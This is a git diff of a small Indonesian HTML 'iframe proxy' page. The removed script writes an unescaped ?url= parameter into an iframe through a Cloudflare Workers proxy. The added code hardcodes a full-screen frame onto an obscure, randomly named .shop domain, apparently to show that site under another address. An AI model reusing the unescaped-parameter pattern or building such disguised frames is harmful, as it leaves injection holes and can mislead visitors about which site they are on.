@@ -1,33 +1,21 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Iframe Proxy</title>
-<style>
-  body { margin: 0; }
-  iframe {
-    border: none;
-    width: 100%;
-    height: 100vh;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Website Proxy Iframe</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100vh; overflow: hidden;
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100vh;
+    }
+  </style>
 </head>
 <body>
-
-<script>
-  // Ambil parameter ?url= dari query string
-  const params = new URLSearchParams(window.location.search);
-  const targetUrl = params.get("url");
-
-  if (targetUrl) {
-    // Gabungkan dengan Cloudflare Workers kamu
-    const proxyUrl = "https://gentle-block-5894.974hyacintha.workers.dev/" + targetUrl;
-    document.write(`<iframe src="${proxyUrl}"></iframe>`);
-  } else {
-    document.body.innerHTML = "<h3>⚠️ Parameter ?url= tidak ditemukan.</h3>";
-  }
-</script>
-
+  <iframe src="https://gentle-block-5894.974hyacintha.workers.dev=https://genegc02.ya8z6nutsz3jhbtmail.shop/id"></iframe>
 </body>
 </html>
